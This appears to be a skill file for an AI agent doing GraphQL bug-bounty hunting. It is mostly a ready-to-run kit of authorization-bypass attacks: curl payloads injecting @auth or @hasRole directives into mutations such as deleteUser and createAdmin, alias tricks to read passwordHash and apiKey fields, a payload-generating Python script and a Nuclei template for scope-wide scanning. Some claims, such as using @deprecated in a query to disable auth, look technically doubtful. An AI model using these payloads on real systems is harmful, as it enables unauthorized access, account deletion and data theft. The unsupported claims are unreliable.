---
name: graphql-directive-fuzzer
description: "GraphQL directive injection and deception fuzzer. Covers: directive enumeration via introspection, @skip/@include behavioral differences, custom directive injection for auth bypass, alias-based bypass, gql-introspect helper to auto-generate test queries, Nuclei template for scope-wide scanning. Load when: GraphQL introspection available or GraphQL endpoint confirmed. EV: $2K-$15K per confirmed auth bypass."
version: 1.0
created: 2026-04-11
owner: cyber-operator
trigger_keywords: "graphql directive, @skip, @include, @auth directive, graphql auth bypass, directive injection, graphql schema directive, introspection directive, @hasRole, @requiresAuth, directive deception"
---

# GraphQL Directive Injection Fuzzer

## Why Directives Are Underexplored

GraphQL directives are modifier annotations (`@skip`, `@include`, `@auth`, `@deprecated`) that change how fields are resolved. Custom authorization directives are widely used as a DRY alternative to per-resolver auth checks — but they're often inconsistently applied, misconfigured, or can be deceived by client-controlled arguments.

**Coverage note:** This attack class has low dup rates because most hunters only test IDOR/batching/injection. Directive attacks require schema analysis that most automated scanners miss.

---

## Step 1 — Enumerate Directives from Schema

```bash
# Introspection query — extract all directives:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{
    "query": "{ __schema { directives { name description locations args { name type { name kind } } } } }"
  }' | python3 -m json.tool

# Look for custom (non-standard) directives:
# Standard: @skip, @include, @deprecated, @specifiedBy
# Custom (HIGH VALUE — test these): @auth, @requiresAuth, @hasRole, @internal, @admin, @scope
```

**Vulnerability signal:** Any directive with `FIELD_DEFINITION` location AND authorization-sounding name.

```python
#!/usr/bin/env python3
# gql-introspect.py — auto-generates directive test variants from schema
import requests, json, sys

ENDPOINT = sys.argv[1] if len(sys.argv) > 1 else "https://target.com/graphql"

# Fetch schema
introspection_query = """
{
  __schema {
    directives {
      name
      description
      locations
      args { name defaultValue type { name kind } }
    }
    types {
      name
      kind
      fields {
        name
        type { name kind ofType { name } }
      }
    }
  }
}
"""

resp = requests.post(ENDPOINT, json={"query": introspection_query}, timeout=10)
schema = resp.json()

# Extract custom directives
standard = {"skip", "include", "deprecated", "specifiedBy"}
directives = schema["data"]["__schema"]["directives"]
custom = [d for d in directives if d["name"] not in standard]

print(f"\n[*] Custom directives found: {len(custom)}")
for d in custom:
    print(f"\n  @{d['name']}")
    print(f"    Locations: {d['locations']}")
    print(f"    Args: {[a['name'] for a in d['args']]}")
    
    # Generate test payloads for each directive
    print(f"    Test payloads:")
    print(f"      query {{ sensitiveField @{d['name']} }}")
    for arg in d["args"]:
        print(f"      query {{ sensitiveField @{d['name']}({arg['name']}: true) }}")
        print(f"      query {{ sensitiveField @{d['name']}({arg['name']}: \"admin\") }}")
```

---

## Step 2 — `@skip` / `@include` Behavioral Differences

**Description:** `@skip(if: true)` should skip a field. `@include(if: false)` should exclude it. Some GraphQL server implementations apply these at execution time but perform authorization checks before them — meaning the field is authorized and resolved (data accessed), then the directive removes it from the response. The field still executes.

**Test:**
```bash
# Baseline: request field without include → if auth error, it's protected
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user { id adminData } }"}' 
# Expected if protected: {"errors":[{"message":"Not authorized"}]}

# Test: does @include(if: false) bypass auth check?
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user { id adminData @include(if: false) } }"}'
# Vulnerable: No error (server resolved but didn't return = auth check bypassed by timing)
# Confirmed vulnerable: Different error message / different response shape

# Test: @skip timing — resolves before skip?
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ user { id adminData @skip(if: true) } }"}'
# If this triggers side effects (audit log, rate limit hit, DB read):
# → Field was resolved before skip = server-side impact without client seeing data
```

---

## Step 3 — Custom Directive Injection (Auth Bypass)

**Description:** Some GraphQL servers check for the *presence* of a custom directive like `@auth(role: "admin")` on the schema definition but don't validate that a *client-supplied* directive directive actually evaluates to required permissions. If the server applies directives from the client query rather than the schema, an attacker can inject auth directives.

**Test:**
```bash
# Test: can client inject @auth directive on a protected mutation?
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { deleteUser(id: 1) @auth(role: \"admin\", skip: true) }"}'

# Variations to try:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { deleteUser(id: 1) @requiresAuth(bypass: true) }"}'

curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "mutation { createAdmin { id } @hasRole(roles: [\"ADMIN\"]) }"}'

# Also: inject on fragment spreads (less commonly checked):
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "query { ...AdminFields @auth(role: \"admin\") } fragment AdminFields on Query { adminPanel { users } }"}'
```

**Vulnerable implementation (Nexus/Apollo example):**
```javascript
// VULNERABLE: reads directive from query instead of schema definition
if (query.directives.some(d => d.name === 'auth' && d.args.bypass !== 'false')) {
    allowAccess = true;  // Client-controlled → bypass
}
```

---

## Step 4 — Alias-Based Auth Bypass

**Description:** GraphQL allows field aliasing. Some authorization middleware checks the field name but not the alias. If a field is aliased to something that bypasses a name-based auth check, the underlying resolver executes with full access.

**Test:**
```bash
# Standard field (protected):
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ adminUsers { id email } }"}'
# → "Not authorized"

# Aliased field — does alias bypass the check?
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ publicData: adminUsers { id email } }"}'
# → If 200 with data: alias bypassed name-based auth check

# Nested alias bypass:
curl -s -X POST https://target.com/graphql \
  -d '{"query":"{ me { profile: adminData { passwordHash apiKey } } }"}'
```

---

## Step 5 — Directive Skip on Expensive Auth Resolvers

**Description:** `@deprecated` and `@skip(if: false)` can sometimes cause server-side auth resolvers to be skipped when the field is "skipped" at the client level but still executes on the server.

**Exploit — `@deprecated` + sensitive field:**
```bash
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ sensitiveField @deprecated(reason: \"test\") }"}'
# → Deprecated directive on field MAY disable auth check on some implementations
```

---

## Pre-Built Nuclei Template

```yaml
id: graphql-directive-auth-bypass
info:
  name: GraphQL Directive Auth Bypass
  severity: high
  description: Tests if custom authorization directives can be bypassed by injecting them from client side
  tags: graphql,auth,directive

requests:
  - method: POST
    path:
      - "{{BaseURL}}/graphql"
      - "{{BaseURL}}/api/graphql"
      - "{{BaseURL}}/gql"
    headers:
      Content-Type: application/json
    body: '{"query":"mutation @auth(role: \"admin\", bypass: true) { updateEmail(email: \"test@test.com\") { success } }"}'
    matchers-condition: and
    matchers:
      - type: status
        status: [200]
      - type: word
        words:
          - '"success"'
          - '"data"'
        condition: or
      - type: word
        words:
          - '"errors"'
          - '"Unauthorized"'
          - '"Forbidden"'
        negative: true
```

```bash
# Run scope-wide:
nuclei -l graphql-endpoints.txt -t custom/graphql-directive-bypass.yaml -rate-limit 5
```

---

*GraphQL Directive Fuzzer v1.0 | GraphQL Security Track | Whitehat System*
